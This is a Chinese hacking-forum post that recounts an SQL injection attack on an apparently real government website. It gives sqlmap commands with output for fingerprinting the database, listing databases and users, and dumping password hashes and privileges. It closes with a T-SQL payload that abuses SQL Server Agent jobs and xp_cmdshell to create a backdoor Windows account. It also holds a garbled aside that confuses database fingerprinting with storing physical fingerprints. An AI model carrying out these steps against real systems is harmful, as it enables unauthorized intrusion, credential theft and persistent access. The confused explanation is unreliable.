@@ -1,0 +1,132 @@
+] 关于一个 public权限注入点的 逻辑
+这段时间一直在研究SQL注入 和 几个脚本  感觉收获还是很大的  看了论坛这几天的动态 发现炊少又开始了
+
+哎 这里是个家 可是这家里的人 都不用心  麻烦你们 别什么都只依靠别人 很多事情都是自己实践出来的 别梦想着拜师
+
+别人教你的 永远都是别人的 自己研究的才是自己的 如果你们不想一直在后面捡屁吃 那么请你们振作起来  我记得我说过的话  
+
+让9区 超越t00ls 吧  我在为这个努力  虽然我不知道你们有多少人赞成我的观点 可是我觉得这是我的目标  现实中我过的很安逸 
+
+SB ark  也就是ps7 那SB知道 我在一家大公司做管理 我只想能把我在网络的这个家维持好  请你们自我反省下  
+
+其实我和JOE 还有SEEK liscia 烂J8 砍少 平时都很少说话 一般只有在遇到技术难点的时候 才会问问对方 其中还有蓝孩 大F 呵呵  大家努力吧  
+
+请你们把自己当作 9区 能独挡一面的人 别老是一双眼镜看着炊少 炊少是刀子嘴豆腐心 很多事情 他嘴硬可是心软 你多问几次他就会告诉你
+
+你也别指望他会发很多心思来把你教懂 他只会点出你错误的地方 具体的原理什么的 还是要你自己去找 什么东西 自己实践一篇就可以了
+
+好了 说了很多废话 可是我是真心希望9区 能走下去的 
+
+说下 sql server 2000 中 一个public 权限注入的问题  前段时间看了个站发现一个注入点 主站是aspx的 注入点基本没有 有的也上了防注入 
+
+找了一会发现他有旧版的网站 asp的 很多注入点都做了安全 后来被我找到一个很诧异的sql注入 python sqlmap/sqlmap.py -u http://www.XXX.gov.cn/oldweb/XXXX/KSXZ.asp?lmid=100 
+复制代码跑了下 发现能把所有的库都列不出来 
+
+原本以为能跨裤  结果发现悲剧了  那怎么办呢 注入是在 可是列不出库 后来自己 研究了下 SQLMAP注入工具的一些资料 整理出以下方法 代码如下 python sqlmap/sqlmap.py -u http://www.XXX.gov.cn/oldweb/XXXX/KSXZ.asp?lmid=100  -v 1 -f -b 数据库指纹输出
+复制代码什么叫做 数据库指纹输出 其实说白了就是一下几点 ：根据用户需要进行调查和分析,了解它们对数据倍息处理的目的和要求,确定数据库指纹管理系统应具备下列功能: (1)建库和存储指纹及与该指纹有关的人员的情况信息l (2)方便用户对库进行插入、删除、修改、添加赫记录’ (3)为用户提供准确、快速的查询检索手段
+
+查出来的结果：   May  3 2005 23:18:38   Copyright (c) 1988-2003 Microsoft Corporation  Standard
+
+Edition on Windows NT 5.2 (Build 3790: Service Pack 1)
+
+web server operating system: Windows 2003
+
+web application technology: ASP.NET, Microsoft IIS 6.0, ASP
+
+back-end DBMS operating system: Windows 2003 Service Pack 1
+
+back-end DBMS: active fingerprint: Microsoft SQL Server 2000
+
+               banner parsing fingerprint: Microsoft SQL Server 2000 Service Pac
+
+k 4 version 8.00.2039
+
+               html error message fingerprint: Microsoft SQL Server
+
+banner:
+
+---
+
+Microsoft SQL Server  2000 - 8.00.2039 (Intel X86)
+
+        May  3 2005 23:18:38
+
+        Copyright (c) 1988-2003 Microsoft Corporation
+
+        Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 1)
+
+---
+复制代码上面是什么意思 我就不多说了 这个网站数据库所在的服务器的 系统 什么的 大家应该都知道了 
+
+为什么要做指纹输出呢 python sqlmap/sqlmap.py -u http://www.XXX.gov.cn/oldweb/XXXX/KSXZ.asp?lmid=100 --user-agent --dbs
+复制代码很多网站这么执行是查不出数据库的 因为sqlmap的默认读取数据库 是用的默认的组件 所以你要知道数据库指纹输出之后 
+
+再来搞定列库 我整理出来的是一下代码 python sqlmap/sqlmap.py -u http://www.XXX.gov.cn/oldweb/XXXX/KSXZ.asp?lmid=100 --user-agent "Mozilla/4.0 (compatible; MSIE 8.0; Windows
+
+NT 5.2; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.
+
+648; .NET CLR 3.5.21022; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)" --dbs
+复制代码这样之后 数据库就出来了 别问我为什么 自己百度下
+
+数据全部列出来了 然后我要看看这个注入点的权限 判断当前用户是否是dba
+
+python sqlmap/sqlmap.py -u http://www.XXX.gov.cn/oldweb/XXXX/KSXZ.asp?lmid=100  --is-dba -v 1
+复制代码出来的结果 current user is DBA:    'False'
+复制代码看到这个结果 大家都懂的 我就不解释了  
+
+然后我查看下数据库的用户有哪些 python sqlmap/sqlmap.py -u http://www.XXX.gov.cn/oldweb/XXXX/KSXZ.asp?lmid=100 --users -v 0
+复制代码输出的结果 database management system users [1]:
+
+[*] BUILTIN\Administrators
+复制代码好吧 大家懂了么 没懂的可以自己去百度了 
+
+本来还想列出数据库密码的结果 碎了  把语句发出来给大家吧
+
+列数据库密码： python sqlmap/sqlmap.py -u http://www.XXX.gov.cn/oldweb/XXXX/KSXZ.asp?lmid=100  --passwords -v 0
+
+python sqlmap/sqlmap.py -u http://www.XXX.gov.cn/oldweb/XXXX/KSXZ.asp?lmid=100  --passwords -U sa -v 0
+复制代码为什么有两个 大家懂的 下面那个是针对sa权限的 
+
+然后查看下数据用户的权限： python sqlmap/sqlmap.py -u http://www.XXX.gov.cn/oldweb/XXXX/KSXZ.asp?lmid=100 --privileges -v 0
+
+python sqlmap/sqlmap.py -u http://www.XXX.gov.cn/oldweb/XXXX/KSXZ.asp?lmid=100 --privileges -U postgres -v 0
+复制代码由于我测试的网站是public权限 所以输出是错误的 我就不贴出来了 方法是给大家了
+
+渗透到这一步 基本的数据库的信息都收集的差不多了 注入了 就找后台 后来是膜拜了各位神也没把后台找出来了
+
+最终放弃了 从sql注入点入手吧 然后从网上找了些资料 问了下蓝娃 蓝娃给我这么个东西 我贴出来给大家吧 SQL Server Agent 这服务必须开启
+
+
+
+开启服务后进入查询分析器. 这里我是用新建的public用户 
+
+
+
+首先 Select host_name() 获取当前库服务器机器名
+
+然后在查询分析器执行下面的代码 
+
+USE msdb; 
+
+EXEC sp_add_job @job_name = 'GetSystemOnSQL',
+
+@enabled = 1,
+
+@delete_level = 1; 
+
+EXEC sp_add_jobstep @job_name = 'GetSystemOnSQL',
+
+@step_name = 'Exec my sql',
+
+@subsystem = 'TSQL',
+
+@command = 'exec master..xp_execresultset N''select ''''exec
+
+master..xp_cmdshell "net user iisloger hook /add> c:\fish.txt"'''''',N''Master''';
+
+EXEC sp_add_jobserver @job_name = 'GetSystemOnSQL', 
+
+@server_name = 'rst-29w3h2q5x73'; 
+
+EXEC sp_start_job @job_name = 'GetSystemOnSQL'--
+复制代码public 那全新啊的方法 大家自己看吧  要用sql分析器- - 可是这站是站库分离 只支持内网访问  
